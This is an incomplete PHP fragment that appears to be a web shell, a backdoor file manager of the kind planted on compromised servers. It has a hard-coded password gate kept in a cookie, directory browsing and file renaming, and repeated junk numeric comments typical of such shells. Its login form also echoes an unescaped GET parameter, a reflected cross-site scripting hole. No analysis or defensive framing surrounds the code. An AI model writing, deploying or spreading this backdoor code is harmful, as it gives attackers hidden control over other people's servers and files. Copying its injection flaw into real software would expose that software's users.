...
$auth_key = "d7af72fd6ed36c7315f99924e4bd21cf";
...
$pass = false;
if (isset($_COOKIE['pw_name_59103'])) {
    if(($_COOKIE['pw_name_59103']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_59103'])) {
        if(($_POST['pw_name_59103']) == $auth_key) {
            setcookie("pw_name_59103", $_POST['pw_name_59103']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_59103' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724929077530127 1724929077228194 1724929077715649 1724929077763594
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724929077530127 1724929077228194 1724929077715649 1724929077763594
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724929077530127 1724929077228194 1724929077715649 1724929077763594
            $name = PATH . "/" . $_GET['r'];
